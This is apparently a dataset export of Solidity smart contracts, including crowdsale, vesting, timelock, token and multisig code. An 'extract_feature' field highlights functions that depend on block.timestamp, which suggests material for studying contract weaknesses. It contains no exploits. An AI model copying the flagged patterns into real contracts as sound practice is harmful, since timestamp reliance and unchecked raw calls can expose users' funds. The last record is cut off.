uint256 public vestingTokens;\n uint256 public vestingDuration;\n uint256 public vestingPeriod;\n address public vestingBeneficiary;\n GambioVesting public vesting;\n event Finalized();\n event FinishMinting();\n event TokensMinted(\n address indexed beneficiary,\n uint256 indexed amount\n );\n constructor(uint256 _hardCap, uint256[] _vestingData, address _beneficiary)\n public {\n require(_vestingData.length == 3);\n require(_hardCap > 0);\n require(_vestingData[0] > 0);\n require(_vestingData[1] > 0);\n require(_vestingData[2] > 0);\n require(_beneficiary != address(0));\n hardCap = _hardCap;\n vestingTokens = _vestingData[0];\n vestingDuration = _vestingData[1];\n vestingPeriod = _vestingData[2];\n vestingBeneficiary = _beneficiary;\n }\n function finalize() public onlyOwner {\n require(!isFinalized);\n vesting = new GambioVesting(vestingPeriod, vestingBeneficiary, now, 0, vestingDuration, false);\n token.mint(address(vesting), vestingTokens);\n emit Finalized();\n isFinalized = true;\n }\n function finishMinting() public onlyOwner {\n require(token.mintingFinished() == false);\n require(isFinalized);\n token.finishMinting();\n emit FinishMinting();\n }\n function mint(address beneficiary, uint256 amount) public onlyOwner {\n require(!token.mintingFinished());\n require(isFinalized);\n require(amount > 0);\n require(beneficiary != address(0));\n token.mint(beneficiary, amount);\n emit TokensMinted(beneficiary, amount);\n }\n function hasEnded() public view returns (bool) {\n bool capReached = weiRaised >= hardCap;\n return super.hasEnded() || capReached || isFinalized;\n }\n}\ncontract OnlyWhiteListedAddresses is Ownable {\n using SafeMath for uint256;\n address utilityAccount;\n mapping(address => bool) whitelist;\n mapping(address => address) public referrals;\n modifier onlyOwnerOrUtility() {\n require(msg.sender == owner || msg.sender == utilityAccount);\n _;\n }\n event WhitelistedAddresses(\n address[] users\n );\n event ReferralsAdded(\n address[] user,\n address[] referral\n );\n constructor(address _utilityAccount) public {\n utilityAccount = _utilityAccount;\n }\n function whitelistAddress(address[] users) public onlyOwnerOrUtility {\n for (uint i = 0; i < users.length; i++) {\n whitelist[users[i]] = true;\n }\n emit WhitelistedAddresses(users);\n }\n function addAddressReferrals(address[] users, address[] _referrals) public onlyOwnerOrUtility {\n require(users.length == _referrals.length);\n for (uint i = 0; i < users.length; i++) {\n require(isWhiteListedAddress(users[i]));\n referrals[users[i]] = _referrals[i];\n }\n emit ReferralsAdded(users, _referrals);\n }\n function isWhiteListedAddress(address addr) public view returns (bool) {\n return whitelist[addr];\n }\n}\ncontract GambioCrowdsale is CappedCrowdsale, OnlyWhiteListedAddresses {\n using SafeMath for uint256;\n struct TokenPurchaseRecord {\n uint256 timestamp;\n uint256 weiAmount;\n address beneficiary;\n }\n uint256 transactionId = 1;\n mapping(uint256 => TokenPurchaseRecord) pendingTransactions;\n mapping(uint256 => bool) completedTransactions;\n uint256 public referralPercentage;\n uint256 public individualCap;\n event TokenPurchaseRequest(\n uint256 indexed transactionId,\n address beneficiary,\n uint256 indexed timestamp,\n uint256 indexed weiAmount,\n uint256 tokensAmount\n );\n event ReferralTokensSent(\n address indexed beneficiary,\n uint256 indexed tokensAmount,\n uint256 indexed transactionId\n );\n event BonusTokensSent(\n address indexed beneficiary,\n uint256 indexed tokensAmount,\n uint256 indexed transactionId\n );\n constructor(\n uint256 _startTime,\n uint256 _endTime,\n uint256 _icoHardCapWei,\n uint256 _referralPercentage,\n uint256 _rate,\n address _wallet,\n uint256 _privateWeiRaised,\n uint256 _individualCap,\n address _utilityAccount,\n uint256 _tokenCap,\n uint256[] _vestingData\n )\n public\n OnlyWhiteListedAddresses(_utilityAccount)\n CappedCrowdsale(_icoHardCapWei, _vestingData, _wallet)\n Crowdsale(_startTime, _endTime, _rate, _wallet, _privateWeiRaised, _tokenCap)\n {\n referralPercentage = _referralPercentage;\n individualCap = _individualCap;\n }\n function() external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(!isFinalized);\n require(beneficiary == msg.sender);\n require(msg.value != 0);\n require(msg.value >= individualCap);\n uint256 weiAmount = msg.value;\n require(isWhiteListedAddress(beneficiary));\n require(validPurchase(weiAmount));\n weiRaised = weiRaised.add(weiAmount);\n uint256 _transactionId = transactionId;\n uint256 tokensAmount = weiAmount.mul(rate);\n pendingTransactions[_transactionId] = TokenPurchaseRecord(now, weiAmount, beneficiary);\n transactionId += 1;\n emit TokenPurchaseRequest(_transactionId, beneficiary, now, weiAmount, tokensAmount);\n forwardFunds();\n }\n function delayIcoEnd(uint256 newDate) public onlyOwner {\n require(newDate != 0);\n require(newDate > now);\n require(!hasEnded());\n require(newDate > endTime);\n endTime = newDate;\n }\n function increaseWeiRaised(uint256 amount) public onlyOwner {\n require(now < startTime);\n require(amount > 0);\n require(weiRaised.add(amount) <= hardCap);\n weiRaised = weiRaised.add(amount);\n }\n function decreaseWeiRaised(uint256 amount) public onlyOwner {\n require(now < startTime);\n require(amount > 0);\n require(weiRaised > 0);\n require(weiRaised >= amount);\n weiRaised = weiRaised.sub(amount);\n }\n function issueTokensMultiple(uint256[] _transactionIds, uint256[] bonusTokensAmounts) public onlyOwner {\n require(isFinalized);\n require(_transactionIds.length == bonusTokensAmounts.length);\n for (uint i = 0; i < _transactionIds.length; i++) {\n issueTokens(_transactionIds[i], bonusTokensAmounts[i]);\n }\n }\n function issueTokens(uint256 _transactionId, uint256 bonusTokensAmount) internal {\n require(completedTransactions[_transactionId] != true);\n require(pendingTransactions[_transactionId].timestamp != 0);\n TokenPurchaseRecord memory record = pendingTransactions[_transactionId];\n uint256 tokens = record.weiAmount.mul(rate);\n address referralAddress = referrals[record.beneficiary];\n token.mint(record.beneficiary, tokens);\n emit TokenPurchase(record.beneficiary, record.weiAmount, tokens, _transactionId);\n completedTransactions[_transactionId] = true;\n if (bonusTokensAmount != 0) {\n require(bonusTokensAmount != 0);\n token.mint(record.beneficiary, bonusTokensAmount);\n emit BonusTokensSent(record.beneficiary, bonusTokensAmount, _transactionId);\n }\n if (referralAddress != address(0)) {\n uint256 referralAmount = tokens.mul(referralPercentage).div(uint256(100));\n token.mint(referralAddress, referralAmount);\n emit ReferralTokensSent(referralAddress, referralAmount, _transactionId);\n }\n }\n function validPurchase(uint256 weiAmount) internal view returns (bool) {\n bool withinCap = weiRaised.add(weiAmount) <= hardCap;\n bool withinCrowdsaleInterval = now >= startTime && now <= endTime;\n return withinCrowdsaleInterval && withinCap;\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract Migrations {\n address public owner;\n uint public lastCompletedMigration;\n modifier restricted() {\n if (msg.sender == owner) _;\n }\n constructor() public {\n owner = msg.sender;\n }\n function setCompleted(uint completed) public restricted {\n lastCompletedMigration = completed;\n }\n function upgrade(address newAddress) public restricted {\n Migrations upgraded = Migrations(newAddress);\n upgraded.setCompleted(lastCompletedMigration);\n }\n}",
  "extract_feature": [
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f2d"
  },
  "filename": "7086.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract TokenTimelockController is Ownable {\n using SafeMath for uint;\n struct TokenTimelock {\n uint256 amount;\n uint256 releaseTime;\n bool released;\n bool revocable;\n bool revoked;\n }\n event TokenTimelockCreated(\n address indexed beneficiary,\n uint256 releaseTime,\n bool revocable,\n uint256 amount\n );\n event TokenTimelockRevoked(\n address indexed beneficiary\n );\n event TokenTimelockBeneficiaryChanged(\n address indexed previousBeneficiary,\n address indexed newBeneficiary\n );\n event TokenTimelockReleased(\n address indexed beneficiary,\n uint256 amount\n );\n uint256 public constant TEAM_LOCK_DURATION_PART1 = 1 * 365 days;\n uint256 public constant TEAM_LOCK_DURATION_PART2 = 2 * 365 days;\n uint256 public constant INVESTOR_LOCK_DURATION = 6 * 30 days;\n mapping (address => TokenTimelock[]) tokenTimeLocks;\n ERC20 public token;\n address public crowdsale;\n bool public activated;\n constructor(ERC20 _token) public {\n token = _token;\n }\n modifier onlyCrowdsale() {\n require(msg.sender == crowdsale);\n _;\n }\n modifier onlyWhenActivated() {\n require(activated);\n _;\n }\n modifier onlyValidTokenTimelock(address _beneficiary, uint256 _id) {\n require(_beneficiary != address(0));\n require(_id < tokenTimeLocks[_beneficiary].length);\n require(!tokenTimeLocks[_beneficiary][_id].revoked);\n _;\n }\n function setCrowdsale(address _crowdsale) external onlyOwner {\n require(_crowdsale != address(0));\n crowdsale = _crowdsale;\n }\n function activate() external onlyCrowdsale {\n activated = true;\n }\n function createInvestorTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyCrowdsale returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n TokenTimelock memory tokenLock = TokenTimelock(\n _amount,\n _start.add(INVESTOR_LOCK_DURATION),\n false,\n false,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock.releaseTime,\n false,\n _amount);\n return true;\n }\n function createTeamTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyOwner returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n uint256 amount = _amount.div(2);\n TokenTimelock memory tokenLock1 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART1),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock1);\n TokenTimelock memory tokenLock2 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART2),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock2);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock1.releaseTime,\n true,\n amount);\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock2.releaseTime,\n true,\n amount);\n return true;\n }\n function revokeTokenTimelock(\n address _beneficiary,\n uint256 _id)\n external onlyWhenActivated onlyOwner onlyValidTokenTimelock(_beneficiary, _id)\n {\n require(tokenTimeLocks[_beneficiary][_id].revocable);\n require(!tokenTimeLocks[_beneficiary][_id].released);\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n tokenLock.revoked = true;\n require(token.transfer(owner, tokenLock.amount));\n emit TokenTimelockRevoked(_beneficiary);\n }\n function getTokenTimelockCount(address _beneficiary) view external returns (uint) {\n return tokenTimeLocks[_beneficiary].length;\n }\n function getTokenTimelockDetails(address _beneficiary, uint256 _id) view external returns (\n uint256 _amount,\n uint256 _releaseTime,\n bool _released,\n bool _revocable,\n bool _revoked)\n {\n require(_id < tokenTimeLocks[_beneficiary].length);\n _amount = tokenTimeLocks[_beneficiary][_id].amount;\n _releaseTime = tokenTimeLocks[_beneficiary][_id].releaseTime;\n _released = tokenTimeLocks[_beneficiary][_id].released;\n _revocable = tokenTimeLocks[_beneficiary][_id].revocable;\n _revoked = tokenTimeLocks[_beneficiary][_id].revoked;\n }\n function changeBeneficiary(uint256 _id, address _newBeneficiary) external onlyWhenActivated onlyValidTokenTimelock(msg.sender, _id) {\n tokenTimeLocks[_newBeneficiary].push(tokenTimeLocks[msg.sender][_id]);\n if (tokenTimeLocks[msg.sender].length > 1) {\n tokenTimeLocks[msg.sender][_id] = tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)];\n delete(tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)]);\n }\n tokenTimeLocks[msg.sender].length--;\n emit TokenTimelockBeneficiaryChanged(msg.sender, _newBeneficiary);\n }\n function release(uint256 _id) external {\n releaseFor(msg.sender, _id);\n }\n function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n require(!tokenLock.released);\n require(block.timestamp >= tokenLock.releaseTime);\n tokenLock.released = true;\n require(token.transfer(_beneficiary, tokenLock.amount));\n emit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n }\n}",
  "extract_feature": [
    "function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\nTokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\nrequire(!tokenLock.released);\nrequire(block.timestamp >= tokenLock.releaseTime);\ntokenLock.released = true;\nrequire(token.transfer(_beneficiary, tokenLock.amount));\nemit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f2e"
  },
  "filename": "711.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Owned {\n address public owner;\n address public newOwner;\n modifier onlyOwner { require(msg.sender == owner); _; }\n event OwnerUpdate(address _prevOwner, address _newOwner);\n function Owned() public {\n owner = msg.sender;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n require(_newOwner != owner);\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n OwnerUpdate(owner, newOwner);\n owner = newOwner;\n newOwner = 0x0;\n }\n}\ncontract ERC20 {\n function totalSupply() public view returns (uint _totalSupply);\n function balanceOf(address _owner) public view returns (uint balance);\n function transfer(address _to, uint _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint _value) public returns (bool success);\n function approve(address _spender, uint _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\ncontract ERC20Token is ERC20 {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalToken;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function totalSupply() public view returns (uint256) {\n return totalToken;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract H2OC is ERC20Token, Owned {\n string public constant name = \"H2O Chain\";\n string public constant symbol = \"H2OC\";\n uint256 public constant decimals = 18;\n uint256 public tokenDestroyed;\n event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);\n function H2OC() public {\n totalToken = 60000000000000000000000000000;\n balances[msg.sender] = totalToken;\n }\n function transferAnyERC20Token(address _tokenAddress, address _recipient, uint256 _amount) public onlyOwner returns (bool success) {\n return ERC20(_tokenAddress).transfer(_recipient, _amount);\n }\n function burn (uint256 _burntAmount) public returns (bool success) {\n require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);\n balances[msg.sender] = balances[msg.sender].sub(_burntAmount);\n totalToken = totalToken.sub(_burntAmount);\n tokenDestroyed = tokenDestroyed.add(_burntAmount);\n require (tokenDestroyed <= 30000000000000000000000000000);\n Transfer(address(this), 0x0, _burntAmount);\n Burn(msg.sender, _burntAmount, block.timestamp);\n return true;\n }\n}",
  "extract_feature": [
    "function burn (uint256 _burntAmount) public returns (bool success) {\nrequire(balances[msg.sender] >= _burntAmount && _burntAmount > 0);\nbalances[msg.sender] = balances[msg.sender].sub(_burntAmount);\ntotalToken = totalToken.sub(_burntAmount);\ntokenDestroyed = tokenDestroyed.add(_burntAmount);\nrequire (tokenDestroyed <= 30000000000000000000000000000);\nTransfer(address(this), 0x0, _burntAmount);\nBurn(msg.sender, _burntAmount, block.timestamp);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f2f"
  },
  "filename": "7214.sol",
  "content": "pragma solidity ^0.4.13;\ncontract DSAuthority {\n function canCall(\n address src, address dst, bytes4 sig\n ) public view returns (bool);\n}\ncontract DSAuthEvents {\n event LogSetAuthority (address indexed authority);\n event LogSetOwner (address indexed owner);\n}\ncontract DSAuth is DSAuthEvents {\n DSAuthority public authority;\n address public owner;\n function DSAuth() public {\n owner = msg.sender;\n LogSetOwner(msg.sender);\n }\n function setOwner(address owner_)\n public\n auth\n {\n owner = owner_;\n LogSetOwner(owner);\n }\n function setAuthority(DSAuthority authority_)\n public\n auth\n {\n authority = authority_;\n LogSetAuthority(authority);\n }\n modifier auth {\n require(isAuthorized(msg.sender, msg.sig));\n _;\n }\n function isAuthorized(address src, bytes4 sig) internal view returns (bool) {\n if (src == address(this)) {\n return true;\n } else if (src == owner) {\n return true;\n } else if (authority == DSAuthority(0)) {\n return false;\n } else {\n return authority.canCall(src, this, sig);\n }\n }\n}\ncontract DSExec {\n function tryExec( address target, bytes calldata, uint value)\n internal\n returns (bool call_ret)\n {\n return target.call.value(value)(calldata);\n }\n function exec( address target, bytes calldata, uint value)\n internal\n {\n if(!tryExec(target, calldata, value)) {\n revert();\n }\n }\n function exec( address t, bytes c )\n internal\n {\n exec(t, c, 0);\n }\n function exec( address t, uint256 v )\n internal\n {\n bytes memory c; exec(t, c, v);\n }\n function tryExec( address t, bytes c )\n internal\n returns (bool)\n {\n return tryExec(t, c, 0);\n }\n function tryExec( address t, uint256 v )\n internal\n returns (bool)\n {\n bytes memory c; return tryExec(t, c, v);\n }\n}\ncontract DSNote {\n event LogNote(\n bytes4 indexed sig,\n address indexed guy,\n bytes32 indexed foo,\n bytes32 indexed bar,\n uint wad,\n bytes fax\n ) anonymous;\n modifier note {\n bytes32 foo;\n bytes32 bar;\n assembly {\n foo := calldataload(4)\n bar := calldataload(36)\n }\n LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n _;\n }\n}\ncontract DSGroup is DSExec, DSNote {\n address[] public members;\n uint public quorum;\n uint public window;\n uint public actionCount;\n mapping (uint => Action) public actions;\n mapping (uint => mapping (address => bool)) public confirmedBy;\n mapping (address => bool) public isMember;\n event Proposed (uint id, bytes calldata);\n event Confirmed (uint id, address member);\n event Triggered (uint id);\n struct Action {\n address target;\n bytes calldata;\n uint value;\n uint confirmations;\n uint deadline;\n bool triggered;\n }\n function DSGroup(\n address[] members_,\n uint quorum_,\n uint window_\n ) {\n members = members_;\n quorum = quorum_;\n window = window_;\n for (uint i = 0; i < members.length; i++) {\n isMember[members[i]] = true;\n }\n }\n function memberCount() constant returns (uint) {\n return members.length;\n }\n function target(uint id) constant returns (address) {\n return actions[id].target;\n }\n function calldata(uint id) constant returns (bytes) {\n return actions[id].calldata;\n }\n function value(uint id) constant returns (uint) {\n return actions[id].value;\n }\n function confirmations(uint id) constant returns (uint) {\n return actions[id].confirmations;\n }\n function deadline(uint id) constant returns (uint) {\n return actions[id].deadline;\n }\n function triggered(uint id) constant returns (bool) {\n return actions[id].triggered;\n }\n function confirmed(uint id) constant returns (bool) {\n return confirmations(id) >= quorum;\n }\n function expired(uint id) constant returns (bool) {\n return now > deadline(id);\n }\n function deposit() note payable {\n }\n function propose(\n address target,\n bytes calldata,\n uint value\n ) onlyMembers note returns (uint id) {\n id = ++actionCount;\n actions[id].target = target;\n actions[id].calldata = calldata;\n actions[id].value = value;\n actions[id].deadline = now + window;\n Proposed(id, calldata);\n }\n function confirm(uint id) onlyMembers onlyActive(id) note {\n assert(!confirmedBy[id][msg.sender]);\n confirmedBy[id][msg.sender] = true;\n actions[id].confirmations++;\n Confirmed(id, msg.sender);\n }\n function trigger(uint id) onlyMembers onlyActive(id) note {\n assert(confirmed(id));\n actions[id].triggered = true;\n exec(actions[id].target, actions[id].calldata, actions[id].value);\n Triggered(id);\n }\n modifier onlyMembers {\n assert(isMember[msg.sender]);\n _;\n }\n modifier onlyActive(uint id) {\n assert(!expired(id));\n assert(!triggered(id));\n _;\n }\n function getInfo() constant returns (\n uint quorum_,\n uint memberCount,\n uint window_,\n uint actionCount_\n ) {\n return (quorum, members.length, window, actionCount);\n }\n function getActionStatus(uint id) constant returns (\n uint confirmations,\n uint deadline,\n bool triggered,\n address target,\n uint value\n ) {\n return (\n actions[id].confirmations,\n actions[id].deadline,\n actions[id].triggered,\n actions[id].target,\n actions[id].value\n );\n }\n}\ncontract DSGroupFactory is DSNote {\n mapping (address => bool) public isGroup;\n function newGroup(\n address[] members,\n uint quorum,\n uint window\n ) note returns (DSGroup group) {\n group = new DSGroup(members, quorum, window);\n isGroup[group] = true;\n }\n}\ncontract DSMath {\n function add(uint x, uint y) internal pure returns (uint z) {\n require((z = x + y) >= x);\n }\n function sub(uint x, uint y) internal pure returns (uint z) {\n require((z = x - y) <= x);\n }\n function mul(uint x, uint y) internal pure returns (uint z) {\n require(y == 0 || (z = x * y) / y == x);\n }\n function min(uint x, uint y) internal pure returns (uint z) {\n return x <= y ? x : y;\n }\n function max(uint x, uint y) internal pure returns (uint z) {\n return x >= y ? x : y;\n }\n function imin(int x, int y) internal pure returns (int z) {\n return x <= y ? x : y;\n }\n function imax(int x, int y) internal pure returns (int z) {\n return x >= y ? x : y;\n }\n uint constant WAD = 10 ** 18;\n uint constant RAY = 10 ** 27;\n function wmul(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, y), WAD / 2) / WAD;\n }\n function rmul(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, y), RAY / 2) / RAY;\n }\n function wdiv(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, WAD), y / 2) / y;\n }\n function rdiv(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, RAY), y / 2) / y;\n }\n function rpow(uint x, uint n) internal pure returns (uint z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n}\ncontract DSThing is DSAuth, DSNote, DSMath {\n function S(string s) internal pure returns (bytes4) {\n return bytes4(keccak256(s));\n }\n}\ncontract WETH9_ {\n string public name = \"Wrapped Ether\";\n string public symbol = \"WETH\";\n uint8 public decimals = 18;\n event Approval(address indexed src, address indexed guy, uint wad);\n event Transfer(address indexed src, address indexed dst, uint wad);\n event Deposit(address indexed dst, uint wad);\n event Withdrawal(address indexed src, uint wad);\n mapping (address => uint) public balanceOf;\n mapping (address => mapping (address => uint)) public allowance;\n function() public payable {\n deposit();\n }\n function deposit() public payable {\n balanceOf[msg.sender] += msg.value;\n Deposit(msg.sender, msg.value);\n }\n function withdraw(uint wad) public {\n require(balanceOf[msg.sender] >= wad);\n balanceOf[msg.sender] -= wad;\n msg.sender.transfer(wad);\n Withdrawal(msg.sender, wad);\n }\n function totalSupply() public view returns (uint) {\n return this.balance;\n }\n function approve(address guy, uint wad) public returns (bool) {\n allowance[msg.sender][guy] = wad;\n Approval(msg.sender, guy, wad);\n return true;\n }\n function transfer(address dst, uint wad) public returns (bool) {\n return transferFrom(msg.sender, dst, wad);\n }\n function transferFrom(address src, address dst, uint wad)\n public\n returns (bool)\n {\n require(balanceOf[src] >= wad);\n if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n require(allowance[src][msg.sender] >= wad);\n allowance[src][msg.sender] -= wad;\n }\n balanceOf[src] -= wad;\n balanceOf[dst] += wad;\n Transfer(src, dst, wad);\n return true;\n }\n}\ninterface FundInterface {\n event PortfolioContent(address[] assets, uint[] holdings, uint[] prices);\n event RequestUpdated(uint id);\n event Redeemed(address indexed ofParticipant, uint atTimestamp, uint shareQuantity);\n event FeesConverted(uint atTimestamp, uint shareQuantityConverted, uint unclaimed);\n event CalculationUpdate(uint atTimestamp, uint managementFee, uint performanceFee, uint nav, uint sharePrice, uint totalSupply);\n event ErrorMessage(string errorMessage);\n function requestInvestment(uint giveQuantity, uint shareQuantity, address investmentAsset) external;\n function executeRequest(uint requestId) external;\n function cancelRequest(uint requestId) external;\n function redeemAllOwnedAssets(uint shareQuantity) external returns (bool);\n function enableInvestment(address[] ofAssets) external;\n function disableInvestment(address[] ofAssets) external;\n function shutDown() external;\n function emergencyRedeem(uint shareQuantity, address[] requestedAssets) public returns (bool success);\n function calcSharePriceAndAllocateFees() public returns (uint);\n function getModules() view returns (address, address, address);\n function getLastRequestId() view returns (uint);\n function getManager() view returns (address);\n function performCalculations() view returns (uint, uint, uint, uint, uint, uint, uint);\n function calcSharePrice() view returns (uint);\n}\ninterface AssetInterface {\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n function transfer(address _to, uint _value, bytes _data) public returns (bool success);\n function transfer(address _to, uint _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint _value) public returns (bool success);\n function approve(address _spender, uint _value) public returns (bool success);\n function balanceOf(address _owner) view public returns (uint balance);\n function allowance(address _owner, address _spender) public view returns (uint remaining);\n}\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract Asset is DSMath, ERC20Interface {\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public _totalSupply;\n function transfer(address _to, uint _value)\n public\n returns (bool success)\n {\n require(balances[msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[msg.sender] = sub(balances[msg.sender], _value);\n balances[_to] = add(balances[_to], _value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n require(_from != address(0));\n require(_to != address(0));\n require(_to != address(this));\n require(balances[_from] >= _value);\n require(allowed[_from][msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint _value) public returns (bool) {\n require(_spender != address(0));\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n constant\n public\n returns (uint)\n {\n return allowed[_owner][_spender];\n }\n function balanceOf(address _owner) constant public returns (uint) {\n return balances[_owner];\n }\n function totalSupply() view public returns (uint) {\n return _totalSupply;\n }\n}\ninterface SharesInterface {\n event Created(address indexed ofParticipant, uint atTimestamp, uint shareQuantity);\n event Annihilated(address indexed ofParticipant, uint atTimestamp, uint shareQuantity);\n function getName() view returns (bytes32);\n function getSymbol() view returns (bytes8);\n function getDecimals() view returns (uint);\n function getCreationTime() view returns (uint);\n function toSmallestShareUnit(uint quantity) view returns (uint);\n function toWholeShareUnit(uint quantity) view returns 